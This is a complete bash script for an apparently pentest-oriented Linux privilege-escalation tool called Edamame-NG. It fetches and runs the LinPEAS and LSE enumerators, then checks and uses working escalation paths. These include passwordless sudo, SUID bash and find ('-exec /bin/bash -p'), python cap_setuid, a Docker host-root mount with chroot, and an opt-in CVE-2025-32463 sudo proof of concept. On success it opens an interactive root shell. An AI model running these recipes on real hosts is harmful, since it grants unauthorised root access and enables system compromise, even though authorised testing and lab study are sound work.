#!/usr/bin/env bash
# Edamame-NG: host-local Linux enumeration and verified privilege proof.
set -uo pipefail
umask 077

if [[ $(uname -s) != Linux ]]; then
  printf 'Edamame-NG Linux runner requires Linux.\n' >&2
  exit 2
fi

RUN_BASE="${HOME}/edamame-ng-runs"
CACHE_BASE="${XDG_CACHE_HOME:-${HOME}/.cache}/edamame-ng"
TOOL_DIR=''
MODE='auto'
RESUME_ID=''
NO_SHELL=0
CATALOG_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/catalog"
CVE_QUERY=''
POC_QUERY=0
LAB_CVE_ENABLED=0
CVE_SUDO='/opt/edamame-vuln-sudo/bin/sudo'
CVE_SUDO_SHA='8c18093b760250d35b1ebcc5ecd12b33d17b8a2cfc27f170bbb4f62b674702cd'
CVE_POC_SHA='9826979c7a3cb1ca582862768d74245806051db5601c7b6a7e13bde93b8052d7'

usage() {
  cat <<'EOF'
Usage: edamame-ng.sh [--scan | --resume [RUN_ID]] [--output-dir DIR]
                      [--tool-dir DIR] [--catalog-dir DIR] [--no-shell]
                      [--enable-cve-2025-32463-lab]
       edamame-ng.sh --cve CVE-YYYY-NNNN [--catalog-dir DIR]
       edamame-ng.sh --poc CVE-YYYY-NNNN [--catalog-dir DIR]
Run with no mode to choose Resume (default) or Scan when a prior success exists.
--tool-dir accepts local assets only when each has an adjacent .sha256 file.
EOF
}

while (($#)); do
  case $1 in
    --scan) MODE=scan; shift ;;
    --resume) MODE=resume; shift; if (($#)) && [[ $1 != --* ]]; then RESUME_ID=$1; shift; fi ;;
    --output-dir) (($# >= 2)) || { usage >&2; exit 2; }; RUN_BASE=$2; shift 2 ;;
    --tool-dir) (($# >= 2)) || { usage >&2; exit 2; }; TOOL_DIR=$2; shift 2 ;;
    --catalog-dir) (($# >= 2)) || { usage >&2; exit 2; }; CATALOG_DIR=$2; shift 2 ;;
    --cve) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; shift 2 ;;
    --poc) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; POC_QUERY=1; shift 2 ;;
    --enable-cve-2025-32463-lab) LAB_CVE_ENABLED=1; shift ;;
    --no-shell) NO_SHELL=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) usage >&2; exit 2 ;;
  esac
done
CVE_POC="$CATALOG_DIR/pocs/CVE-2025-32463/sudo-chwoot.sh"
CVE_CURATED="$CATALOG_DIR/curated-eop.tsv"
[[ -f $CVE_CURATED ]] || CVE_CURATED=/dev/null

sha256_file() {
  local binary line digest
  for binary in /usr/bin/sha256sum /bin/sha256sum; do
    if [[ -x $binary ]]; then
      line=$("$binary" "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  for binary in /usr/bin/shasum /bin/shasum; do
    if [[ -x $binary ]]; then
      line=$("$binary" -a 256 "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  return 1
}

trusted_root_file() {
  local path=$1 mode
  [[ $path == /* && -f $path ]] || return 1
  while [[ $path != / ]]; do
    [[ ! -L $path && $(/usr/bin/stat -c %u "$path" 2>/dev/null) == 0 ]] || return 1
    mode=$(/usr/bin/stat -c %a "$path" 2>/dev/null) || return 1
    [[ $mode =~ ^[0-7]+$ ]] || return 1
    (( (8#$mode & 8#22) == 0 )) || return 1
    path=${path%/*}
    [[ -n $path ]] || path=/
  done
}

if [[ -n $CVE_QUERY ]]; then
  [[ $CVE_QUERY =~ ^CVE-[0-9]{4}-[0-9]{4,}$ ]] || { printf 'Invalid CVE ID.\n' >&2; exit 2; }
  if ((POC_QUERY)); then
    [[ -f $CATALOG_DIR/poc_refs.tsv ]] || { printf 'Offline PoC manifest unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tsource\tpath\tsha256\treview_state\n'
    poc_found=0
    while IFS=$'\t' read -r id _kind source _commit relative digest _license state; do
      [[ $id == "$CVE_QUERY" ]] || continue
      poc_found=1
      if [[ $relative == - ]]; then
        printf '%s\treference-only\t%s\t\t\t%s\n' "$id" "$source" "$state"
        continue
      fi
      [[ $relative =~ ^pocs/CVE-[0-9]{4}-[0-9]{4,}/[A-Za-z0-9._-]+$ && $relative == "pocs/$CVE_QUERY/"* && $digest =~ ^[0-9a-f]{64}$ ]] || { printf 'Invalid PoC manifest entry.\n' >&2; exit 2; }
      asset="$CATALOG_DIR/$relative"
      [[ -f $asset && ! -L $asset && $(sha256_file "$asset") == "$digest" ]] || { printf 'PoC asset missing or digest mismatch.\n' >&2; exit 2; }
      printf '%s\tverified-bundle\t%s\t%s\t%s\t%s\n' "$id" "$source" "$asset" "$digest" "$state"
    done < <(tail -n +2 "$CATALOG_DIR/poc_refs.tsv")
    ((poc_found)) || printf '%s\tnot-indexed\t\t\t\t\n' "$CVE_QUERY"
  else
    [[ -f $CATALOG_DIR/local-eop.tsv ]] || { printf 'Offline catalog unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n'
    awk -F '\t' -v id="$CVE_QUERY" 'FNR>1 && $1==id {print $1 "\tindexed-review-only\t" $2 "\t" $3 "\t" $4 "\t" $5; found=1; exit} END {if (!found) print id "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" id}' "$CATALOG_DIR/local-eop.tsv" "$CVE_CURATED"
  fi
  exit 0
fi

safe_name() { [[ $1 =~ ^[A-Za-z0-9._+-]+$ && $1 != . && $1 != .. ]]; }
host_name=$(hostname -s 2>/dev/null || hostname)
host_name=${host_name//[^A-Za-z0-9._-]/_}

if [[ -L $RUN_BASE || -L $CACHE_BASE ]]; then
  printf 'Run and cache directories must not be symbolic links.\n' >&2
  exit 2
fi

latest_success() {
  [[ -d $RUN_BASE ]] || return 1
  find "$RUN_BASE" -mindepth 2 -maxdepth 2 -name success.tsv -type f -print 2>/dev/null |
    sort -r | while IFS= read -r candidate; do
      IFS=$'\t' read -r candidate_host _ < "$candidate"
      if [[ $candidate_host == "$host_name" ]]; then
        printf '%s\n' "$candidate"
        break
      fi
    done
}

if [[ $MODE == auto ]]; then
  prior=$(latest_success || true)
  if [[ -n $prior ]]; then
    if [[ -t 0 ]]; then
      read -r -p "Prior success found. [R]esume (default) or [S]can? " choice
      [[ $choice == [sS]* ]] && MODE=scan || MODE=resume
    else
      MODE=resume
    fi
  else
    MODE=scan
  fi
fi

success_file=''
if [[ $MODE == resume ]]; then
  if [[ -n $RESUME_ID ]]; then
    safe_name "$RESUME_ID" || { printf 'Invalid run ID.\n' >&2; exit 2; }
    success_file="$RUN_BASE/$RESUME_ID/success.tsv"
  else
    success_file=$(latest_success || true)
  fi
  [[ -n $success_file && -f $success_file && ! -L $success_file && ! -L ${success_file%/success.tsv} ]] || {
    printf 'No valid successful run to resume.\n' >&2; exit 2;
  }
  IFS=$'\t' read -r saved_host recipe _ < "$success_file"
  [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
  case $recipe in
    already-root|sudo-shell|suid-bash|suid-find|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
    *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
  esac
  if [[ $recipe == cve-2025-32463-lab ]] && (( ! LAB_CVE_ENABLED )); then
    printf 'Saved CVE recipe requires --enable-cve-2025-32463-lab.\n' >&2
    exit 2
  fi
  printf '[RESUME] %s on %s; checking prerequisites again.\n' "$recipe" "$host_name"
  RUN_DIR=${success_file%/success.tsv}
else
  mkdir -p "$RUN_BASE" "$CACHE_BASE" || exit 2
  chmod 700 "$RUN_BASE" "$CACHE_BASE" || exit 2
  run_id="$(date -u +%Y%m%dT%H%M%SZ)-${host_name}-$$"
  RUN_DIR="$RUN_BASE/$run_id"
  mkdir -m 700 "$RUN_DIR" "$RUN_DIR/.capture" || exit 2
  : > "$RUN_DIR/tools.tsv"
  : > "$RUN_DIR/findings.tsv"
  : > "$RUN_DIR/attempts.tsv"
  : > "$RUN_DIR/coverage.tsv"
  printf '[RUN] %s\n' "$RUN_DIR"
fi

record_attempt() {
  printf '%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" "$2" >> "$RUN_DIR/attempts.tsv"
}

record_finding() {
  local category=$1 detail=$2
  printf '%s\t%s\n' "$category" "$detail" >> "$RUN_DIR/findings.tsv"
  printf '[FOUND] %s: %s\n' "$category" "$detail"
}

asset_from_release() {
  local repo=$1 asset=$2 dest=$3 tag expected url html actual cache_dir cached
  cache_dir="$CACHE_BASE/${repo//\//_}"
  mkdir -p "$cache_dir"
  chmod 700 "$cache_dir"
  cached="$cache_dir/$asset"
  if [[ -n $TOOL_DIR ]]; then
    if [[ -f $TOOL_DIR/$asset && -f $TOOL_DIR/$asset.sha256 ]]; then
      expected=$(awk 'NR==1 {print $1}' "$TOOL_DIR/$asset.sha256" | tr '[:upper:]' '[:lower:]')
      actual=$(sha256_file "$TOOL_DIR/$asset")
      if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
        cp "$TOOL_DIR/$asset" "$dest"
        printf '%s\tlocal\t%s\t%s\n' "$asset" "$TOOL_DIR/$asset" "$actual" >> "$RUN_DIR/tools.tsv"
        return 0
      fi
    fi
    printf '[WARN] Local %s is missing or its checksum failed.\n' "$asset" >&2
  else
    url=$(curl -fsSLI --connect-timeout 5 --max-time 20 -o /dev/null -w '%{url_effective}' "https://github.com/$repo/releases/latest" 2>/dev/null || true)
    tag=${url##*/}
    if safe_name "$tag" && [[ $url == "https://github.com/$repo/releases/tag/"* ]]; then
      html="$RUN_DIR/.capture/${asset}.release.html"
      if curl -fsSL --connect-timeout 5 --max-time 25 "https://github.com/$repo/releases/expanded_assets/$tag" -o "$html" 2>/dev/null; then
        expected=$(awk -v n="$asset" 'index($0,"digest for " n "\"") {if (match($0,/sha256:[a-f0-9]{64}/)) {print substr($0,RSTART+7,64); exit}}' "$html")
        if [[ -z $expected && $repo == diego-treitos/linux-smart-enumeration && $asset == lse.sh ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            cp "$dest" "$cached"
            printf '%s\n' "$actual" > "$cached.sha256"
            printf '%s\t%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" legacy-release-no-published-digest >> "$RUN_DIR/tools.tsv"
            printf '[WARN] %s release publishes no SHA-256; recorded download digest for cache checks.\n' "$asset" >&2
            return 0
          fi
        fi
        if [[ $expected =~ ^[a-f0-9]{64}$ ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            if [[ $actual == "$expected" ]]; then
              cp "$dest" "$cached"
              printf '%s\n' "$expected" > "$cached.sha256"
              printf '%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" >> "$RUN_DIR/tools.tsv"
              return 0
            fi
            rm -f "$dest"
            printf '[WARN] %s digest mismatch.\n' "$asset" >&2
          fi
        fi
      fi
    fi
    printf '[WARN] Current %s unavailable; checking verified cache.\n' "$asset" >&2
  fi
  if [[ -f $cached && -f $cached.sha256 ]]; then
    expected=$(awk 'NR==1 {print $1}' "$cached.sha256" | tr '[:upper:]' '[:lower:]')
    actual=$(sha256_file "$cached")
    if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
      cp "$cached" "$dest"
      printf '%s\tcache\t%s\t%s\n' "$asset" "$cached" "$actual" >> "$RUN_DIR/tools.tsv"
      return 0
    fi
  fi
  printf '%s\tmissing\t-\t-\n' "$asset" >> "$RUN_DIR/tools.tsv"
  return 1
}

verify_recipe() {
  local recipe=$1 py caps image probe version cve_dir finder
  case $recipe in
    already-root) [[ $EUID == 0 ]] ;;
    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$EUID" = 0' >/dev/null 2>&1 ;;
    suid-bash)
      [[ -u /bin/bash && $(stat -Lc %u /bin/bash 2>/dev/null) == 0 ]] &&
        /bin/bash -p -c 'test "$EUID" = 0' >/dev/null 2>&1
      ;;
    suid-find)
      for finder in /usr/bin/find /bin/find; do
        [[ -x $finder && -u $finder && $(stat -Lc %u "$finder" 2>/dev/null) == 0 ]] || continue
        probe=$("$finder" /dev/null -exec /bin/bash -p -c 'printf "uid=%s\n" "$EUID"' \; 2>/dev/null) || continue
        if [[ $probe == uid=0 ]]; then SUID_FIND_PATH=$finder; return 0; fi
      done
      return 1
      ;;
    python-cap-setuid)
      py=$(command -v python3 || true)
      [[ -n $py ]] && command -v getcap >/dev/null 2>&1 || return 1
      caps=$(getcap "$py" 2>/dev/null)
      [[ $caps == *cap_setuid* ]] && "$py" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
      ;;
    docker-host-root)
      command -v docker >/dev/null 2>&1 || return 1
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      [[ -n $image ]] || return 1
      timeout 30 docker run --rm --pull never --network none --entrypoint /bin/sh -v /:/host:ro "$image" -c 'chroot /host /bin/sh -c "test \"\$(id -u)\" = 0"' >/dev/null 2>&1
      ;;
    cve-2025-32463-lab)
      ((LAB_CVE_ENABLED)) || return 1
      [[ -x /usr/bin/stat && -x /usr/bin/timeout && -x /usr/bin/gcc ]] || return 1
      cve_dir=${CVE_SUDO%/*}
      trusted_root_file "$CVE_SUDO" && [[ -u $CVE_SUDO ]] || return 1
      trusted_root_file "$CVE_POC" || return 1
      [[ $(sha256_file "$CVE_SUDO") == "$CVE_SUDO_SHA" ]] || return 1
      version=$("$CVE_SUDO" -V 2>/dev/null) || return 1
      [[ ${version%%$'\n'*} == 'Sudo version 1.9.16p2' ]] || return 1
      [[ $(sha256_file "$CVE_POC") == "$CVE_POC_SHA" ]] || return 1
      probe=$(PATH="$cve_dir:/usr/sbin:/usr/bin:/sbin:/bin" /usr/bin/timeout 30 /bin/bash "$CVE_POC" --probe 2>&1) || return 1
      printf '%s\n' "$probe" | /usr/bin/grep -qx '0'
      ;;
    *) return 1 ;;
  esac
}

open_shell() {
  local recipe=$1 image py
  if ((NO_SHELL)); then
    printf '[PROOF] %s verified. Shell suppressed by --no-shell.\n' "$recipe"
    return 0
  fi
  [[ -t 0 && -t 1 ]] || { printf '[WARN] Interactive TTY required for elevated shell. Resume from a terminal.\n' >&2; return 0; }
  printf '[SHELL] %s. Exit to return to Edamame-NG.\n' "$recipe"
  case $recipe in
    already-root) /bin/bash -i ;;
    sudo-shell) sudo -n /bin/bash -i ;;
    suid-bash) /bin/bash -p -i ;;
    suid-find) "$SUID_FIND_PATH" /dev/null -exec /bin/bash -p -i \; ;;
    python-cap-setuid)
      py=$(command -v python3)
      "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
      ;;
    docker-host-root)
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      docker run --rm -it --pull never --network none --entrypoint /bin/sh -v /:/host:rw "$image" -c 'chroot /host /bin/bash -i'
      ;;
    cve-2025-32463-lab)
      PATH="${CVE_SUDO%/*}:/usr/sbin:/usr/bin:/sbin:/bin" /bin/bash "$CVE_POC" --shell
      ;;
  esac
}

if [[ $MODE == resume ]]; then
  if verify_recipe "$recipe"; then
    record_attempt "$recipe" resumed-proof
    open_shell "$recipe"
    exit 0
  fi
  record_attempt "$recipe" resume-prerequisite-failed
  printf '[WARN] Saved recipe no longer works. Use --scan.\n' >&2
  exit 1
fi

if [[ -n $TOOL_DIR ]]; then
  printf '[ENUM] Loading verified local assets.\n'
else
  printf '[ENUM] Fetching official current release assets.\n'
fi
linpeas="$RUN_DIR/.capture/linpeas.sh"
lse="$RUN_DIR/.capture/lse.sh"
have_linpeas=0; have_lse=0
linpeas_complete=0; lse_complete=0
asset_from_release peass-ng/PEASS-ng linpeas.sh "$linpeas" && have_linpeas=1
asset_from_release diego-treitos/linux-smart-enumeration lse.sh "$lse" && have_lse=1

if ((have_linpeas)); then
  printf '[ENUM] LinPEAS\n'
  if timeout 600 bash "$linpeas" > "$RUN_DIR/.capture/linpeas-output.txt" 2>&1; then
    printf 'linpeas\tchecked\n' >> "$RUN_DIR/coverage.tsv"
    linpeas_complete=1
  else
    printf 'linpeas\tpartial\n' >> "$RUN_DIR/coverage.tsv"
  fi
else
  printf 'linpeas\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi
if ((have_lse)); then
  printf '[ENUM] LSE\n'
  if timeout 600 bash "$lse" -i -l2 -c > "$RUN_DIR/.capture/lse-output.txt" 2>&1; then
    printf 'lse\tchecked\n' >> "$RUN_DIR/coverage.tsv"
    lse_complete=1
  else
    printf 'lse\tpartial\n' >> "$RUN_DIR/coverage.tsv"
  fi
else
  printf 'lse\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi

for label in linpeas lse; do
  output="$RUN_DIR/.capture/$label-output.txt"
  if [[ -f $output ]]; then
    count=$(grep -aEic 'writ(e|able)|password|credential|suid|cap_setuid|sudo|CVE-' "$output" || true)
    record_finding "$label-screening" "$count candidate lines in raw output; values withheld from console"
  fi
done

printf '[ENUM] Verifying local escalation paths.\n'
if command -v sudo >/dev/null 2>&1; then
  # shellcheck disable=SC2024 # The current user owns this capture file.
  sudo -n -l > "$RUN_DIR/.capture/sudo-list.txt" 2>&1 || true
fi
if command -v getcap >/dev/null 2>&1; then
  getcap -r /usr/bin /bin 2>/dev/null > "$RUN_DIR/.capture/capabilities.txt" || true
fi
find /usr/bin /bin -maxdepth 1 -perm -4000 -type f 2>/dev/null > "$RUN_DIR/.capture/suid-files.txt" || true

cve_tmp="$RUN_DIR/.capture/cve-candidates.txt"
for file in "$RUN_DIR/.capture/linpeas-output.txt" "$RUN_DIR/.capture/lse-output.txt"; do
  [[ -f $file ]] && grep -aoE 'CVE-[0-9]{4}-[0-9]{4,}' "$file" || true
done | sort -u > "$cve_tmp"
if [[ -s $cve_tmp ]]; then
  record_finding cve-candidates "$(wc -l < "$cve_tmp" | tr -d ' ') suggested; review package/build status"
fi

selected=''
candidates=(already-root sudo-shell suid-bash suid-find python-cap-setuid docker-host-root)
if ((LAB_CVE_ENABLED)); then candidates+=(cve-2025-32463-lab); fi
for candidate in "${candidates[@]}"; do
  if verify_recipe "$candidate"; then
    selected=$candidate
    record_finding local-escalation "$candidate independently verified"
    record_attempt "$candidate" proof-success
    break
  fi
  record_attempt "$candidate" prerequisite-not-met
done
if [[ $selected == cve-2025-32463-lab ]]; then
  printf 'CVE-2025-32463 tested lab build\tchecked\texact sudo and PoC digests plus UID 0 probe\n' >> "$RUN_DIR/coverage.tsv"
elif (( ! LAB_CVE_ENABLED )); then
  printf 'CVE-2025-32463 tested lab build\tunsupported\texplicit lab opt-in not supplied\n' >> "$RUN_DIR/coverage.tsv"
else
  printf 'CVE-2025-32463 tested lab build\tinapplicable\texact reviewed build not detected\n' >> "$RUN_DIR/coverage.tsv"
fi
enum_status=unsupported
if ((linpeas_complete && lse_complete)); then enum_status=checked; fi
while IFS='|' read -r area basis; do
  [[ -n $area ]] && printf '%s\t%s\t%s\n' "$area" "$enum_status" "$basis" >> "$RUN_DIR/coverage.tsv"
done <<'EOF'
Situational Awareness and Initial Enumeration|enumerator output
Check OS version, hostname, IP and distribution.|enumerator output
User and Sudoers Enumeration|enumerator output plus native sudo check
Startup scripts|enumerator output
History and backups|enumerator output
Sudoers|enumerator output plus native sudo check
Installed Applications|enumerator output
Drive Configuration|enumerator output
Service Enum|enumerator output
Docker / LXC Enum|enumerator output plus Docker proof
Running Processes|enumerator output
Network & WiFi Enumeration|local host output only
Cronjobs & Scheduled Tasks|enumerator output; no task change
Common Privilege Escalation Methods|enumerator output plus named recipes
SUID / SGID binaries|enumerator output plus native bash and find proofs
Writable files & directories|enumerator output; no file change
Passwords & sensitive files|enumerator output; values only in protected raw files
Interesting Files|enumerator output
Docker Escape|native Docker proof when prerequisites match
Kernel & exploit checks|enumerator output; CVEs are suggestions only
Environment abuse|enumerator output
Path abuse|enumerator output
Databases|passive enumeration only; no authentication
MYSQL / MariaDB|passive enumeration only; no authentication
POSTGRESQL|passive enumeration only; no authentication
SQLite / SQLite3|passive enumeration only; no authentication
Redis (redis-cli)|passive enumeration only; no authentication
MongoDB|passive enumeration only; no authentication
Automated Privilege Escalation Tools|LinPEAS and LSE
EOF
# shellcheck disable=SC1112 # Preserve the checklist heading verbatim.
printf 'Dump clear PSK keys from the Network Manager if available.\tunsupported\tno cleartext value extraction\nCheck for tasks that are run as root and are world writeable.\tunsupported\timpactful change needs a reviewed recipe\nRev Shell’s\tinapplicable\ttool opens a local shell\nRed Teaming Toolkit\tunsupported\ttool-specific checklist entry\nBeRoot\tunsupported\ttool-specific checklist entry\n' >> "$RUN_DIR/coverage.tsv"
printf 'CVE build and patch applicability\tunsupported\toffline index is a review lead, not a vulnerable-build test\n' >> "$RUN_DIR/coverage.tsv"

# The visible alerts above precede these final output filenames.
for label in linpeas lse; do
  if [[ -f $RUN_DIR/.capture/$label-output.txt ]]; then
    mv "$RUN_DIR/.capture/$label-output.txt" "$RUN_DIR/$label-output.txt"
    printf '[SAVED] %s-output.txt\n' "$label"
  fi
done
while IFS= read -r cve; do
  [[ -n $cve ]] && printf '%s\thttps://www.cve.org/CVERecord?id=%s\n' "$cve" "$cve"
done < "$cve_tmp" > "$RUN_DIR/cve-candidates.tsv"
printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n' > "$RUN_DIR/cve-index.tsv"
if [[ -f $CATALOG_DIR/local-eop.tsv ]]; then
  awk -F '\t' 'FILENAME==ARGV[1] || FILENAME==ARGV[2] {if (FNR>1 && !($1 in record)) {record[$1]=$0; platform[$1]=$2}; next}
    NF {if ($1 in record) {split(record[$1], fields, "\t"); status=(platform[$1]=="linux" ? "indexed-review-only" : "platform-mismatch"); print $1 "\t" status "\t" fields[2] "\t" fields[3] "\t" fields[4] "\t" fields[5]}
    else print $1 "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" $1}' "$CATALOG_DIR/local-eop.tsv" "$CVE_CURATED" "$cve_tmp" >> "$RUN_DIR/cve-index.tsv"
else
  printf '[WARN] Offline CVE catalog unavailable; retaining CVE.org links.\n' >&2
  awk '{print $1 "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" $1}' "$cve_tmp" >> "$RUN_DIR/cve-index.tsv"
fi
printf '[SAVED] findings.tsv, coverage.tsv, attempts.tsv, tools.tsv\n'

if [[ -n $selected ]]; then
  evidence='verified-local-proof'
  if [[ $selected == cve-2025-32463-lab ]]; then
    evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
  fi
  printf '%s\t%s\t%s\n' "$host_name" "$selected" "$evidence" > "$RUN_DIR/success.tsv"
  open_shell "$selected"
  exit 0
fi
printf '[RESULT] No supported local escalation recipe verified. See %s\n' "$RUN_DIR"
exit 0
